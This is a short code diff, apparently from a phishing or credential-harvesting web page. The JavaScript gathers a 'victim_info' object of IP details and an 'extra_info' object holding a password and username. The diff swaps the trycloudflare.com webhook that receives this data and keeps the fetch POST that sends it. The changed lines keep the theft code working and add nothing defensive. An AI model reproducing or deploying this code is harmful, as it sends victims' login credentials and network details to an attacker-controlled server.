@@ -85,11 +85,11 @@ Connection Type: ${connectionType}
 Loading Time: ${loadTime}
                 `;
 
-                const webhookURL = "https://pete-chapter-white-promoted.trycloudflare.com/userData";
+                const webhookURL = "https://tip-division-dover-tough.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
-                    'extra_info': {'password': password, 'username': message}
+                    'extra_info': {'password': message, 'username': username}
                 }
                 fetch(webhookURL, {
                     method: "POST",
